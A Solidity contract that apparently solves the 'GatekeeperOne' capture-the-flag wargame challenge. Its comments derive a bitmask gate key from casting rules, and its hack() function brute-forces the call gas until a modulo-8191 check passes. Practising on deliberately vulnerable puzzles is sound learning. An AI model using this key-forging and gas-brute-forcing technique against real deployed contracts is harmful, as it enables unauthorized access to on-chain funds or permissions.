// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperOne.sol";
import "hardhat/console.sol";

contract GatekeeperOneHack {

	/*
	I'll use a mask for the gateKey, and then use the mask to set the gateKey to the correct value.
	Size of mask must be 64 bits, because its maximum requirements are casted to uint64. 
	One hexa represents 4 bits. 64bits/hexa_size per_bit = 16hexa => i.e. => 0x0000000000000000
		require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
	 	-> less important 32 bits must be equal to the less important 16 bits. 
		=> 0x000000000000FFFF
		require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
	 	-> less important 32 bits must be different to the less important 64 bits. 
		=> 0xFFFFFFFF0000FFFF
		require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
	 	-> less important 32 bits must be equal to the less important 16 bits of the tx.origin. 
		=> 0xFFFFFFFF0000FFFF & tx.origin	 
	*/

	function hack(address _gatekeeperOne) public {
		// console.log("GatekeeperOneHack: hack() called");
		bytes8 gateKey = bytes8(uint64(uint160(msg.sender))) & 0xFFFFFFFF0000FFFF;
		// console.log("Retrieving GatekeeperOne contract ");
		GatekeeperOne gatekeeperOne = GatekeeperOne(_gatekeeperOne);
		// gas used to call GatekeeperOne.enter(), I need the function to have (gasLeft() % 8191 == 0)available for the gate
		// brute force it
		for (uint256 i = 0; i <= 8191; i++) {
			try gatekeeperOne.enter{gas: 80000 + i}(gateKey) {
				// console.log("passed with gas ->", 80000 + i);
				break;
			} catch {}
		}
	}

}
